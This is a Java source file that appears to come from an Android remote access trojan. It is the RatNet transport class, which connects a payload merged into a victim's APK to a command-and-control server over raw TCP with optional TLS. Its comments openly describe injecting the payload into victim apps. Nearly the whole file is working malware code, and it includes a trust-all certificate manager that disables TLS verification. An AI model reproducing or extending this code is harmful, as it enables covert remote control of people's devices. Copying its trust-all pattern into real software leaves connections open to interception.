package com.darkbiit.rat;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.security.cert.X509Certificate;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/**
 * Transport for the RAT channel: a raw TCP socket, optionally wrapped in TLS.
 *
 * The channel is deliberately a plain length-prefixed stream instead of
 * WebSocket: it keeps the payload dependency-free (no OkHttp, no java-websocket
 * classes) so the merged APK cannot clash with the victim app's libraries.
 *
 * The TLS path uses a trust-all manager. That is a deliberate operator choice
 * for self-signed C2 certs; it also means the client is trivially MITM-able.
 */
public final class RatNet implements AutoCloseable {

    private final AtomicBoolean closed = new AtomicBoolean(false);
    private Socket socket;
    private InputStream in;
    private OutputStream out;

    public synchronized void connect() throws IOException {
        close();
        closed.set(false);

        Socket s = new Socket();
        s.setTcpNoDelay(true);
        s.setKeepAlive(true);
        s.connect(new InetSocketAddress(RatCfg.C2_HOST, RatCfg.C2_PORT), RatCfg.CONNECT_TIMEOUT_MS);

        if (RatCfg.USE_WSS) {
            try {
                SSLContext ctx = SSLContext.getInstance("TLS");
                ctx.init(null, new TrustManager[] { new TrustAll() }, new java.security.SecureRandom());
                SSLSocketFactory factory = ctx.getSocketFactory();
                SSLSocket ssl = (SSLSocket) factory.createSocket(s, RatCfg.C2_HOST, RatCfg.C2_PORT, true);
                ssl.setUseClientMode(true);
                ssl.startHandshake();
                s = ssl;
            } catch (Exception e) {
                try {
                    s.close();
                } catch (IOException ignored) {
                    // fall through
                }
                throw new IOException("TLS handshake failed: " + e.getMessage(), e);
            }
        }

        s.setSoTimeout(0); // blocking reads; the reader thread owns the timeout
        this.socket = s;
        this.in = s.getInputStream();
        this.out = s.getOutputStream();
        RatLog.i("connected to " + RatCfg.C2_HOST + ":" + RatCfg.C2_PORT
                + (RatCfg.USE_WSS ? " (tls)" : ""));
    }

    public InputStream input() {
        return in;
    }

    public OutputStream output() {
        return out;
    }

    public boolean isConnected() {
        Socket s = socket;
        return s != null && s.isConnected() && !s.isClosed();
    }

    /** Half-closes the write side so the server sees EOF but we can keep reading. */
    public synchronized void shutdownOutput() {
        try {
            if (socket != null) {
                socket.shutdownOutput();
            }
        } catch (IOException e) {
            RatLog.w("shutdownOutput: " + e.getMessage());
        }
    }

    @Override
    public synchronized void close() {
        if (closed.getAndSet(true)) {
            return;
        }
        try {
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
            RatLog.w("close: " + e.getMessage());
        }
        socket = null;
        in = null;
        out = null;
    }

    /** Trust-all manager for the optional TLS transport. */
    private static final class TrustAll implements X509TrustManager {
        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) {
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
}
